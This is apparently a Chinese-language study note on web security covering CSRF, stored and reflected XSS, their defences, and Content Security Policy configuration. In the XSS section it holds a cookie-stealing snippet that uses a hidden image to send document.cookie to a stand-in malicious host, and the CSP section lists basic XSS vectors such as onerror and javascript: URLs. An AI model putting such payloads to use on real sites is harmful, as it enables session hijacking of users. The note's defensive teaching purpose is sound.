#### CSRF Cross-site request forgery（跨站请求伪造）
参考： http://www.imooc.com/article/13552

过程：用户小明在你的网站A上面登录了，A返回了一个session ID（使用cookie存储）,小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址，小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求，通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。

防御措施：
1）使用token：服务器随机产生tooken，然后以tooken为秘钥产生一段密文，把token和密文都随cookie交给前端，前端发起请求时把密文和token交给后端，后端对token和密文进行验证，看token能不能生成同样的密文，这样即使黑客拿到了token也无法拿到密文
2）使用验证码：每一个重要的post提交页面，使用一个验证码，因为第三方网站是无法获得验证码的
3）检测http的头信息refer。Referer记录了请求的来源地址，服务器要做的是验证这个来源地址是否合法
4）涉及敏感操作的请求改为POST请求

#### XSS cross sit script 跨站请求攻击
参考: http://www.imooc.com/learn/812

* XSS和CSRF都属于跨站攻击，XSS是实现CSRF诸多途径中的一条，但不是唯一一条
* xss的本质是让对方浏览器执行你插入的js ，来获取cookie等信息；csrf是借用用户的身份，向服务器发送请求
* XSS分为存储型和反射型：
    * 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等
    * 反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS

防御措施：
1. 客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行
    * 移除用户上传的DOM属性，如onerror等
    * 移除用户上传的style节点，script节点，iframe节点等
2. 对用户输入的代码标签进行转换（html encode）
3. 对url中的参数进行过滤
4. 对动态输出到页面的内容进行HTML编码
5. 服务端对敏感的Cookie设置 httpOnly属性，使js脚本不能读取到cookie
6. CSP 即是 Content Security Policy

```
var img = document.createElement('img');
img.src='http://www.xss.com?cookie='+document.cookie;
img.style.display='none';
document.getElementsByTagName('body')[0].appendChild(img);

这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
```

目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段xss攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭


#### CSP
* CSP的目的

XSS(Cross Site Scripting) 跨站脚本攻击是最常见也是危害最大的攻击手段，我们前端能够做一些能力范围内的处理，比如最简单的将表单内容脚本序列化为HTML实体，以防止恶意脚本的执行，但除此之外，还有很多跨站脚本攻击的方式，如下：

```html
<a href="javascript:alert(1)"></a>
<iframe src="javascript:alert(1)"></iframe>
<img src="x" onerror="alert(1)" style="">
<video src="x" onerror="alert(1)"></video>
<div onclick="alert(1)" onmouseover="alert(2)"><div></div></div>
```

利用 `javascript:..` 以及 内联事件进行攻击。

为了阻止这些攻击，我们前端也要做不少相应的工作，于是很多人提出能不能从根本上解决问题，让浏览器帮我们做这些事情，这就是 CSP 提出的原因和要解决的问题。

* 原理

原理其实就是白名单机制，开发者明确告诉客户端(浏览器)哪些资源可以加载并执行，我们只需要提供配置，其他的工作由客户端(浏览器)来完成。

* 开启CSP的方式

一、通过 `<meta>` 标签开启
```html
<meta http-equiv="Content-Security-Policy" content="配置项" >
```

二、通过添加 `Content-Security-Policy` 响应头字段
<img src="../../asset/img/csp.png" width="500" />

#### 可配置的选项

```
default-src：用来设置每个选项的默认值

script-src：外部脚本
style-src：样式表
img-src：图像
media-src：媒体文件（音频和视频）
font-src：字体文件
object-src：插件（比如 Flash）
child-src：框架
frame-ancestors：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）
connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）
worker-src：worker脚本
manifest-src：manifest 文件

block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）
upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议
plugin-types：限制可以使用的插件格式
sandbox：浏览器行为的限制，比如不能有弹出窗口等。

report-uri：有时，我们不仅希望浏览器帮我们防止XSS的攻击，还希望将该行为上报到给定的网址，该选项用来配置上报的地址
```

#### 选项的值

每个限制选项可以设置以下几种值

* 主机名：`example.org`，`https://example.com:443`
* 路径名：`example.org/resources/js/`
* 通配符：`*.example.org`，`*://*.example.com:*`（表示任意协议、任意子域名、任意端口）
* 协议名：`https:`、`data:`
* 关键字'self'：当前域名，需要加引号
* 关键字'none'：禁止加载任何外部资源，需要加引号

###### 例子

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
```

上面代码中，CSP 做了如下配置：

* 脚本：只信任当前域名
* `<object>` 标签：不信任任何URL，即不加载任何资源
* 样式表：只信任 `cdn.example.org` 和 `third-party.org`
* 框架（frame）：必须使用HTTPS协议加载
* 其他资源：没有限制